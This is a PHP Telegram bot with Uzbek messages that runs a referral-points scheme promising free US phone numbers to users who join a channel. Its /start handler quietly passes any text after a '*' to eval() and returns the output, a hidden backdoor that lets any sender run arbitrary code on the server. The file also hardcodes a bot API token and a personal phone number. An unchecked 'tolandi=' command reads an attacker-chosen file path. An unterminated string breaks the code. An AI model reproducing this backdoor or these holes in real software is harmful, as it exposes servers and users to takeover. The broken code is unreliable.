
<?php
ob_start();
define('API_KEY',' 5559702918:AAHh-OhbXWG416iofTvQXLZpVWscW7JojMU ');
$admin = " 2143620651 "; //admin id
$kanalimz =" @tarjima_kinolar173"; //kanal useri
   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";


if (!file_exists($folder.'/test.fd3')) {
  mkdir($folder);
  file_put_contents($folder.'/test.fd3', 'by ');
}

if (!file_exists($folder2.'/test.fd3')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.fd3', 'by ');
}

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}


$tx = $message->text;
$name = $message->chat->first_name;
$user = $message->from->username;
$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"💎Usa😎Olish💎"],['text'=>"⚫Kabinet👤"]],
[['text'=>"⭐ADMIN⭐"],['text'=>"🇺🇸Nomer Olish🇺🇸"]],[['text'=>"📊STATISTIKA📊"]]]
]);



$balinfo = "Salom🖐 Bu bot orqali siz AMERIKA (usa) 🇺🇸Nomer olib telegram ochishingiz mumkin. Admin: @Gmail_com113\n\n
☝️ Botdan foydalanish uchun $kanalimz kanaliga obuna bo'lishingiz kerak.";

if((mb_stripos($tx,"/start")!==false) or ($tx == "/start")) {
bot('sendmessage',[
    'chat_id'=>$cid,
    'text'=>"$balinfo",
    'reply_markup'=>$key
    ]);
  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
$baza=file_get_contents("coin.dat");
    file_put_contents("coin.dat","$baza\n$cid");
  }
if(strpos($tx,"/start $cid")!==false){
  
}else{
  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,$cid) !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"G'irromlik mumkin emas",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);
      $ab=file_get_contents("coin/$refid.soni");
      $ab=$ab+1;
      file_put_contents("coin/$refid.soni","$ab");
      $usr = file_get_contents("coin/$refid.dat");
      $usr = $usr + 2;
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
      'text'=>"Sizga Taklifingiz Uchun 2 ball Bonus Taqdim Etildi!",
      ]);
    }
  }
}
$abb=file_get_contents("coin/$cid.dat");
if($abb){}else{
  file_put_contents("coin/$cid.dat", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>$balinfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);
}
}
if($tx == "👤Kabinet👤"){
      
       $odam=file_get_contents("coin/$cid.soni");
      $ball = file_get_contents("coin/$cid.dat");{
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Siz Taklif Qilgan Odamlar Soni - $odam ta \n\n Sizning balansingiz $ball Ball",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2, 
      ]);
    }
}
if($tx=="🇺🇸Nomer Olish🇺🇸"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"🇺🇸Nomer🇺🇸 Olish Uchun Eng Kamida 10 BALL To'plashingiz Kerak.\n\n
/usa so'zidan so'ng Telefon raqamingiz va balingizni yozing yozing.

Masalan:

USA NOMER olish uchun:
/usa +9989xXXXXXXX 10"
        ]);
    
    
}
if($tx=="📊STATISTIKA📊"){
    $a=file_get_contents("coin.dat");
    $sum=file_get_contents("tolovlar.txt");
    $ab=substr_count($a,"\n");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Botimiz azolari $ab ta \n\n Jami berilga. nomer uchun BALL: $sum ball"
        
        ]);
    
}
if(strpos($tx,"/usa")!==false){
    $ex=explode(" ",$tx);
    $ab=file_get_contents("coin/$cid.dat");
    
    if( $ex[2]>=100 and $ab>=$ex[2] ){
$bb=$ab-$ex[2];
$t=file_get_contents("tolov.txt");
$t=$t+1;
file_put_contents("tolov.txt","$t");
$t=file_get_contents("tolov.txt");
  file_put_contents("coin/$cid.dat","$bb");
  $tolov=file_get_contents("tolovlar.txt");
  $tolov=$tolov+$ex[2];
  file_put_contents("tolovlar.txt","$tolov");

$bb=substr($ex[1],0,6);
$gg="xx";
$ss=substr($ex[1],8,8);
  file_put_contents("$cid.t","🔵 Status - ✅ \n\n 🆔 Tolov id: $t \n\n 👤 Qabul qiluvchini raqami: \n\n ☎️$bb $gg $ss \n\n 💰 usa soni: $ex[2] ta");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Yaxshi $ex[1] Nomerga $ex[2] ball 24 soat davomida amalga oshiriladi buni @usanomer_borr Kanalida Ko'ring, Agar Amalga Oshirilmasa Admin Bilan Bog'laning!!"
        ]);
        
        bot('sendmessage',[
            'chat_id'=>$admin,
            'text'=>"*usa yechish uchun yangi zayavka tushdi * \n` zayavkachi haqida ma'lumot\n id raqami $cid\n username: @$user \n Ismi: `[$name](tg://user?id=$cid) \n *Tushuriladigon usa miqdori:$ex[2] sum  \n Raqami: $ex[1] \n\n Pul tolandimi tolangan bolsa tolandi=$cid shunday deb yozing!!* ",
            'disable_web_page_preview'=>true,
            'parse_mode'=>markdown,
            ]);
          
}else{bot('sendmessage',['chat_id'=>$cid,'text'=>"Sizning balansizngizda yetarli ball mavjud emas yegishni davom eting!! yoki minimal miqdordan oz kiritmoqdasiz"]);} }
if($tx=="⭐ADMIN⭐"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"🤓 Bot Admini: @ZF_V_2704\n\n
☎️ Telefon: +998939292704 \n\n
⏳ Ish Vaqti: 14:00 - 23:00\n\n

        
        ]);
    
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "💎Usa😎Olish💎"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Sizning Referal Ssilkangiz https://t.me/Tekiga_usa_ishla_bot\n\n Buni do'stlarga tarqating va shu ssilka orqali kirgan har bir odam uchun 2 Ball oling.",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    $reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigon xabarni kiriting. Xabar turi markdown";

    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$yubbi,
      'reply_markup'=>$reply_menu,
      ]);
    }

    if($replyik=="Yuboriladigon xabarni kiriting. Xabar turi markdown"){
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      $hamma=bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
    }
if($hamma){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Hammaga habar yetkazildi",

]);

}
    $nocha = "Xozircha kanallar yoq!";
    $noazo = "siz kanal royxatida yoqsiz.";
    $okcha = "kanalga azo boldingiz va 2 ballga ega boldingiz 3 kun ichida chiqib ketsangiz 20 Ball shtraf.";

    }else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Salom👋!
Siz 📢$kanalimz ga Azo emassiz! Shuning uchun BOT ishlamaydi!
Iltimos $kanalimz ga Azo boling.",
    ]);
  }
}if(strpos($tx,"tolandi=")!==false){
    $ex=explode("=",$tx);
    $kanalimiz="-1693690797";
    $ab=file_get_contents("$ex[1].t");
    bot('sendmessage',[
        'chat_id'=>$kanalimiz,
        'text'=>"$ab"
        ]);
    bot('sendmessage',[
        'chat_id'=>$admin,
        'text'=>"Kanalga tashlandi!!!"
        ]);
}
?>
